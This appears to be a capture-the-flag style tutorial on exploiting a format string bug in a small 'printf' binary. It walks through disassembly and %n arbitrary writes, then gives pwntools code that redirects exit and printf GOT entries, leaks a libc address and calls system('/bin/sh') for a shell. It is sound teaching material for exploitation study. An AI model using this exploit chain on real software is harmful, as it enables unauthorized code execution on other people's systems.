We will start by inspecting the assembly of our binary. 

Condensed, commented output of `objdump -d -M intel printf`

```
00000000004011b6 <main>:
  4011b6:       f3 0f 1e fa             endbr64 
  4011ba:       55                      push   rbp
  4011bb:       48 89 e5                mov    rbp,rsp
# Our stackframe is size 0x100
  4011be:       48 81 ec 00 01 00 00    sub    rsp,0x100
# Prints prompt
  4011c5:       48 8d 3d 38 0e 00 00    lea    rdi,[rip+0xe38]        # 402004 <_IO_stdin_used+0x4>
  4011cc:       e8 bf fe ff ff          call   401090 <puts@plt>
# Read our name into a buffer at [rbp-0x100]
  4011d1:       48 8b 15 78 2e 00 00    mov    rdx,QWORD PTR [rip+0x2e78]        # 404050 <stdin@@GLIBC_2.2.5>
  4011d8:       48 8d 85 00 ff ff ff    lea    rax,[rbp-0x100]
  4011df:       be 00 01 00 00          mov    esi,0x100
  4011e4:       48 89 c7                mov    rdi,rax
  4011e7:       e8 c4 fe ff ff          call   4010b0 <fgets@plt>
  4011ec:       48 8d 3d 23 0e 00 00    lea    rdi,[rip+0xe23]        # 402016 <_IO_stdin_used+0x16>
  4011f3:       e8 98 fe ff ff          call   401090 <puts@plt>
# Call printf(buffer)
  4011f8:       48 8d 85 00 ff ff ff    lea    rax,[rbp-0x100]
  4011ff:       48 89 c7                mov    rdi,rax
  401202:       b8 00 00 00 00          mov    eax,0x0
  401207:       e8 94 fe ff ff          call   4010a0 <printf@plt>
  40120c:       bf 0a 00 00 00          mov    edi,0xa
# Print a newline
  401211:       e8 6a fe ff ff          call   401080 <putchar@plt>
  401216:       bf 00 00 00 00          mov    edi,0x0
# Calls exit
  40121b:       e8 a0 fe ff ff          call   4010c0 <exit@plt>
```

From the assembly we can see that the general flow of the problem is to ask for
input then just call `printf(buffer)`. This is a seemingly innocuous bug, but it
can actually lead to instruction pointer control. There is a specific printf
format `%n` that _writes_ to memory.

The expected usage of `%n` is to recover the length of the string printed by
printf. It writes the number of characters printed so far to a pointer. 

Consider the following code.

```c
int x;
printf("abc%n\n", &x);
printf("%d\n", x);

// Prints:
// abc
// 3
```

If we can somehow control the ith argument to printf we can write to an
arbitrary location in memory. Inspecting the stackframe layout may give us this
control. The stack frame for main will look like:

```
Note: Zeroes are unreferenced memory, their value may be non-zero at runtime.

rsp (rbp-0x100):  00000000    00000000
rbp-0xf8          00000000    00000000
rbp-0xf0          00000000    00000000
rbp-0xe8          00000000    00000000
rbp-0xe0          00000000    00000000
rbp-0xd8          00000000    00000000
rbp-0xd0          00000000    00000000
rbp-0xc8          00000000    00000000
rbp-0xc0          00000000    00000000
rbp-0xb8          00000000    00000000
rbp-0xb0          00000000    00000000
rbp-0xa8          00000000    00000000
rbp-0xa0          00000000    00000000
rbp-0x98          00000000    00000000
rbp-0x90          00000000    00000000
rbp-0x88          00000000    00000000
rbp-0x80          00000000    00000000
rbp-0x78          00000000    00000000
rbp-0x70          00000000    00000000
rbp-0x68          00000000    00000000
rbp-0x60          00000000    00000000
rbp-0x58          00000000    00000000
rbp-0x50          00000000    00000000
rbp-0x48          00000000    00000000
rbp-0x40          00000000    00000000
rbp-0x38          00000000    00000000
rbp-0x30          00000000    00000000
rbp-0x28          00000000    00000000
rbp-0x20          00000000    00000000
rbp-0x18          00000000    00000000
rbp-0x10          00000000    00000000
rbp-0x8           00000000    00000000
rbp:             [saved rbp] [saved rip]
```

Recall that the 7th argument to printf will be `rsp`. Notice that the buffer we
control is in the same region that our arguments will come from. If we were to
write `aaaaaaaa%6$n` into our buffer, we'd overwrite the memory address
`0x6161616161616161` with `0`. The example stackframe would look like:

```
Note: Zeroes are unreferenced memory, their value may be non-zero at runtime.

rsp (rbp-0x100):  61616161    61616161
rbp-0xf8          6e243625    00000010
rbp-0xf0          00000000    00000000
rbp-0xe8          00000000    00000000
rbp-0xe0          00000000    00000000
rbp-0xd8          00000000    00000000
rbp-0xd0          00000000    00000000
rbp-0xc8          00000000    00000000
rbp-0xc0          00000000    00000000
rbp-0xb8          00000000    00000000
rbp-0xb0          00000000    00000000
rbp-0xa8          00000000    00000000
rbp-0xa0          00000000    00000000
rbp-0x98          00000000    00000000
rbp-0x90          00000000    00000000
rbp-0x88          00000000    00000000
rbp-0x80          00000000    00000000
rbp-0x78          00000000    00000000
rbp-0x70          00000000    00000000
rbp-0x68          00000000    00000000
rbp-0x60          00000000    00000000
rbp-0x58          00000000    00000000
rbp-0x50          00000000    00000000
rbp-0x48          00000000    00000000
rbp-0x40          00000000    00000000
rbp-0x38          00000000    00000000
rbp-0x30          00000000    00000000
rbp-0x28          00000000    00000000
rbp-0x20          00000000    00000000
rbp-0x18          00000000    00000000
rbp-0x10          00000000    00000000
rbp-0x8           00000000    00000000
rbp:             [saved rbp] [saved rip]
```

We can extend this further to write any value into that memory address by adding
an additional format with a length specifier. The format `%100x` will print an
int padded to 100 characters. The format `aaaaaaaa%100d%6$n` will write the
value `100` into memory address `0x61616161616161`.

We almost have an arbitrary write, the only issue is that memory addresses that
contain `00` bytes will terminate our string. The string
`aaaa\x00\x00\x00\x00%100d%6$n` will only print `aaaa` and will not overwrite
the memory at address `0x0000000061616161`. The fix for this is to put our
memory address at the end of the printf format. Unfortunately this usually means
a lot of tedious calculations. Luckily there are libraries developed exactly for
this purpose. I like to use this one [Printf
Exploit](https://github.com/Inndy/formatstring-exploit).

Now that we can overwrite an arbitary memory address, we can start our exploit.

The global offset table is a very nice target for our exploit. It'd be really
nice if we could leak a libc address, overwrite a GOT entry to `system@libc` and
jump to system. This process requires some creative thinking.

A common technique in binary exploitation is to leak an address, then call
`main` again. To do this we can overwrite the GOT entry for `exit` to the
address of `main`. This will cause main to infinite loop, then we can leak a
pointer. The function `main` is called by a libc function called
`__libc_start_main`. We can print main's return address and we'll have a libc
leak.

Once we have a libc leak, we can compute the address for `system@libc` and
overwrite the GOT entry for `printf`. Then if we cause the program to call
`printf("/bin/sh")`, we'll actually call `system("/bin/sh")` and get a shell.

To actually write this exploit we first load our binary and libc with some standard pwntools boilerplate.

```python
from pwn import *
from fmtstr import FormatString

r = process('build/printf')
e = ELF('build/printf')
libc = ELF('/usr/lib/libc.so.6')

# Create a new tmux pane with gdb when using gdb.attach()
context.clear(arch='amd64')
context.terminal = ["tmux", "splitw", "-h"]
```

We use the format string library to cause main to loop

```python
# Cause main to loop
# Offset is 6 since the first 5 args are registers
fmt = FormatString(offset=6, written=0, bits=64)
fmt[e.got['exit']] = e.symbols['main']
payload, sig = fmt.build()

def dump(x):
    try:
        from hexdump import hexdump
        hexdump(x)
    except ImportError:
        import binascii, textwrap
        print('\n'.join(textwrap.wrap(binascii.hexlify(x), 32)))

dump(payload)

r.sendline(payload)
```

Then we leak the address that calls main from `__libc_start_main`. We have to
account for the fact that main is recursively calling itself so there's an extra
stackframe to jump over. Once we leak this value, we can use pwntools to find
which address in libc calls main using `libc_start_main_return` and compute a
difference to find the libc base offset. 

```python
# registers - 5 args
# buffer - 256/8 = 32 args
# rbp - 1 arg
# rip - 1 arg
# buffer - 256/8 = 32 args
# rbp - 1 arg
# 5 + 32 + 1 + 1 + 32 + 1 = 72
# We need to skip the first 72 args to find main's ret address
leak_str = b"%73$16p"

r.sendline(leak_str)

r.recvuntil("0x")
x = r.recvline()
leak = int(x.decode('ascii'),16)

libc_offset = leak - libc.libc_start_main_return
```

Now we overwrite the GOT entry for `printf` to be `system`. After this code
finishes we should just be able to type `/bin/sh` into the next iteration of
main and we will get a shell.

```python
fmt = FormatString(offset=6, written=0, bits=64)
fmt[e.got['printf']] = libc_offset + libc.symbols['system']
payload, sig = fmt.build()

def dump(x):
    try:
        from hexdump import hexdump
        hexdump(x)
    except ImportError:
        import binascii, textwrap
        print('\n'.join(textwrap.wrap(binascii.hexlify(x), 32)))

dump(payload)

r.sendline(payload)
```
